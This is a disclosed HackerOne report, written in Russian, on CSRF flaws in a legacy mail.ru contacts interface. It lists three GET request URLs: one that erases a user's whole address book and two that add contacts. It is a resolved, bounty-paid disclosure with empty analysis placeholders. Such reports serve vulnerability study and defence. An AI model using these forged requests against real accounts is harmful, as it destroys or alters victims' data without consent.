---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '232653'
original_report_id: '232653'
title: CSRF. Удаление адресной книги, добавление контактов
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2017-05-28T15:37:54.402Z'
disclosed_at: '2017-12-29T10:59:35.087Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
asset_identifier: e.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF. Удаление адресной книги, добавление контактов

## Metadata

- HackerOne Report ID: 232653
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2017-12-29T10:59:35.087Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Привет! Мною был обнаружен старый интерфейс управления контактами в почте: https://e.mail.ru/cgi-bin/new_absetup
Не весь функционал там рабочий, но пару CSRF удалось найти:
https://e.mail.ru/cgi-bin/new_absetup?remove&confirm=1 - запрос полностью стирает адресную книгу
https://e.mail.ru/cgi-bin/new_editgroup?addgroup&group_name=test - запрос создает контакт с псевдонимом test
https://e.mail.ru/cgi-bin/abaddfrommail?ids=1&Name_1=test&Email_1=test@mail.ru&Name1_1=test&Name2_1=test - запрос создает контакт с именем, фамилией и псевдонимом test.

Стоит потереть следы старой версии и избавиться от CSRF

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
